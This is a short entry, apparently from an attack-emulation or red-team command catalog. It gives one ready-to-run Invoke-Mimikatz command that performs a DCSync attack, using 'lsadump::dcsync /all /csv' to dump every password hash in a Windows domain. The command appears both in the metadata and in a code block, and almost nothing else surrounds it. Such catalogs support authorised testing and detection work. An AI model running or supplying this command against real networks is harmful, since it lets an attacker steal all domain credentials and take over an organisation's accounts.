---
id: 1f33c029-3b22-42af-8eba-ce3caac1b6ab
name: Perform a DCSync attack and dump all hashes in the Domain using mimikatz
type: command
executor: bash
data: 'Invoke-Mimikatz -Command ''"privilege::debug" "lsadump::dcsync /all /csv"''

  '
output: null
created_at: '2020-07-15T19:05:44.362131+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Perform a DCSync attack and dump all hashes in the Domain using mimikatz

```bash
Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /all /csv"'

```


